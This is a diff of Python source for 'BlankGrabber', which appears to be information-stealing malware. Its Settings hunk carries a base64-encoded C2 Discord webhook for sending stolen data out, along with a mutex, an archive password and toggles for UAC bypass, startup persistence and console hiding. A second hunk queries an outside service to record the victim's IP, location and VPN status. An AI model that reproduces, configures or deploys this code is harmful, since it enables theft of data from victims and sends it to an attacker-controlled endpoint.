@@ -21,14 +21,14 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyOTk5NDI3NzYzMTAzMzQwNC9yLU5lUVBoVGxsZ3JYQXdnM25CaklPZDdxa1JSNGdQNV9sYkpsNW5IbGpUdy1NM2Rud3huUDRjY3hJZ1JnX1Utdm8zdw').decode())
-    Mutex = base64.b64decode('YnhYNUQzb1Z3M2hFalQ2VA==').decode()
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyOTk5NDI3NzYzMTAzMzQwNC9yLU5lUVBoVGxsZ3JYQXdnM25CaklPZDdxa1JSNGdQNV9sYkpsNW5IbGpUdy1NM2Rud3huUDRjY3hJZ1JnX1Utdm8zdw==').decode())
+    Mutex = base64.b64decode('Vk5aM1pRTzU3RGRlamRkUA==').decode()
     PingMe = bool('true')
     Vmprotect = bool('')
     Startup = bool('')
     Melt = bool('')
     UacBypass = bool('')
-    ArchivePassword = base64.b64decode('NQ==').decode()
+    ArchivePassword = base64.b64decode('QUs=').decode()
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
@@ -1319,9 +1319,9 @@ class BlankGrabber:
             r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
             if r.get('status') != 'success':
                 raise Exception('Failed')
-            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
+            data = f'\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}'
             if len(r['reverse']) != 0:
-                data += f"\nReverse DNS: {r['reverse']}"
+                data += f'\nReverse DNS: {r['reverse']}'
         except Exception:
             ipinfo = '(Unable to get IP info)'
         else:
